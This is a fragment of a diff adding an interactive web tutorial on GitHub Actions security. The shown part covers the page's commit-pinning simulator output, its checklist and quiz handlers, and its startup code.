+        badge.className = 'step-badge green';
+        badge.textContent = 'Risk: PROTECTED 🛡️';
+        code.innerHTML = `<code>- <span class="y-key">name</span>: <span class="y-str">Run third-party linter</span>
+<span class="y-hl-green">  <span class="y-key">uses</span>: <span class="y-str">random-dev/cool-linter@a1b2c3d4e5f678901234567890abcdef12345678</span> <span class="y-com"># v1.0.0</span></span></code>`;
+        term.innerHTML =
+          `<div><span class="term-blue">$</span> Fetching exact immutable commit <code>a1b2c3d4e5f6...</code></div>` +
+          `<div><span class="term-green">🛡️ 100% SAFE!</span> Even though the hacker moved the <code>v1</code> tag to <code>f9e8d7...</code>, GitHub ignores the tag and runs ONLY your audited commit <code>a1b2c3d4...</code>!</div>` +
+          `<div><span class="term-blue">💡 Pro Tip:</span> Add Dependabot for <code>github-actions</code> so you get PRs when new safe versions release!</div>`;
+      }
+    }
+
+    // =====================================================
+    // 6. CHECKLIST & INTERACTIVE QUIZ
+    // =====================================================
+    function toggleCheck(label) {
+      setTimeout(() => {
+        const cb = label.querySelector('input');
+        label.classList.toggle('checked', cb.checked);
+      }, 0);
+    }
+
+    function checkQuiz(btn, isCorrect, feedbackId, msg) {
+      const card = btn.closest('.quiz-card');
+      card.querySelectorAll('.quiz-opt').forEach(o => o.classList.remove('correct', 'wrong'));
+      btn.classList.add(isCorrect ? 'correct' : 'wrong');
+
+      const fb = document.getElementById(feedbackId);
+      fb.textContent = msg;
+      fb.className = 'quiz-feedback show ' + (isCorrect ? 'ok' : 'no');
+    }
+
+    // Initialize all simulators on load
+    renderInjSim();
+    renderPermSim();
+    setPinMode('branch');
+  </script>
+</body>
+</html>
